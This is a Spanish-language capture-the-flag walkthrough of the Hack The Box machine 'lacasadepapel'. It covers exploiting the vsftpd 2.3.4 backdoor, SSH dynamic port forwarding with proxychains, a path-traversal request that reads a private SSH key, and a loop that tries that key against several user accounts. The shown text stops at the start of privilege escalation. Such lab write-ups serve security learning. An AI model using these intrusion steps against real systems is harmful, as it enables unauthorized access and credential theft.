# lacasadepapel HTB

# NMAP 

![image](https://github.com/gecr07/lacasadepapel_HTB/assets/63270579/7c21337c-8e5b-4da0-9885-e4673da0b875)


## RCE

Se explota la version de ftp "vsftpd 2.3.4. Este exploit si lo revisas abre una shell en el puerto 6200. 


![image](https://github.com/gecr07/lacasadepapel_HTB/assets/63270579/b8eb9739-6b88-4418-b318-def922cabdbc)

Se mete nuestra public key en authorized keys pero al entrar nos manda otra vez a la Psy Shell. Para aprobechar esto vamos a usar el Dinamic port fowarding


```
ssh -i id_rsa dali@10.129.242.42 -D 1080
# Puerto configurado tambien el proxychains si acepta sock5
```

Para verificar que si tenemos acceso a los puertos de la maquina utiliza

```
proxychains nmap -p 1-10000 $target
```

Para iniciar el firefox con proxychains tienes que ver el output parecido a este:

![image](https://github.com/gecr07/lacasadepapel_HTB/assets/63270579/a3fd1aec-53e8-42b8-9ec4-88a1e3fe9913)


### LFI 

Nos encontramos un LFI y encontramos un id_rsa para probar la key con todos los usuarios 

```
 proxychains curl http://localhost:8000/file/$(echo -n "../.ssh/id_rsa" | base64)
[1] 0:zsh  1:ssh  2:zsh  3:zsh  4:zsh  5:firefox-esr  6:zsh* 7:ssh-                     

for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done
```


## Priv esca

Nos damos cuenta que existe un proceso que se ejecuta desde la carpeta del profesor y que incluso cambia de pid cada minuto lo que sugiere que se esta ejecutando recurrentemente.


```
ps aux | grep "mem"
```

![image](https://github.com/gecr07/lacasadepapel_HTB/assets/63270579/6ca70276-05cd-41c6-bfc0-e268442d3766)




































